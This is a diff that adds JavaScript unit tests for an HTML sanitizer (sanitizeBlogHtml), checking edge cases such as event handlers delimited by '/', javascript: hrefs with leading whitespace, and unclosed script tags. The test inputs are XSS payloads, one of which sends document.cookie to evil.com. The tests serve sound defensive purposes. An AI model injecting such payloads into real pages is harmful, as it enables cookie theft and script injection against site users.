@@ -65,6 +65,31 @@ function main() {
   const safeContent = '<p>Hello <strong>world</strong></p><a href="https://example.com">link</a>';
   assert.equal(sanitizeBlogHtml(safeContent), safeContent, "should leave normal rich content untouched");
 
+  const proseWithOnclickText = '<p>Use the onclick=handler() attribute to bind a click.</p>';
+  assert.equal(
+    sanitizeBlogHtml(proseWithOnclickText),
+    proseWithOnclickText,
+    "should not strip 'onclick=' when it appears as plain text, not a real attribute"
+  );
+
+  assert.equal(
+    sanitizeBlogHtml('<svg/onload=alert(1)>'),
+    "<svg>",
+    "should strip event handlers delimited by '/' instead of whitespace"
+  );
+
+  assert.equal(
+    sanitizeBlogHtml('<a href=" javascript:alert(1)">click</a>'),
+    "<a>click</a>",
+    "should strip javascript: hrefs with leading whitespace inside the quotes"
+  );
+
+  assert.equal(
+    sanitizeBlogHtml('<p>before</p><script>fetch("//evil.com/"+document.cookie)'),
+    "<p>before</p>",
+    "should strip unclosed script tags through to end of string"
+  );
+
   console.log("All blog-content and blog-sanitize checks passed.");
 }
 
